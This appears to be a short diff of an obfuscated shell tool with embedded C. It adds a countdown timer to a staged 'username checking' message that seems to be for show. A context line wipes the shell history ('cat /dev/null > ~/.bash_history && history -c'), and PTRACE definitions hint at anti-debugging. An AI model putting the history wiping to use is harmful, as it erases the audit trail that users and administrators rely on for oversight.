@@ -1708,10 +1708,17 @@ static  char data [] =
 #endif
 }
 tien="sys"
+function leedown () {
+seconds=5; date1=$((`date +%s` + $seconds)); 
+while [ "$date1" -ge `date +%s` ]; do 
+  echo -ne "$(date -u --date @$(($date1 - `date +%s` )) +%H:%M:%S)\r"; 
+done
+}
 function lee-cek () {
 sleep 0.5
 echo -e "\e[0;31mYour username checking in lee dzung systems. Please waiting..............\e[0;0m"
-sleep 5
+sleep 6
+leedown
     echo -e "\e[0;32mChecked finished.\e[0;0m"
        echo ""
 sleep 1
@@ -2830,4 +2837,4 @@ cat /dev/null > ~/.bash_history && history -c
 #include <stdio.h>
 #include <unistd.h>
 #if !defined(PTRACE_ATTACH) && defined(PT_ATTACH)
-#	define PTRACE_ATTACH	PT_ATTACH
+#	define PTRACE_ATTACH	PT_ATTACH"
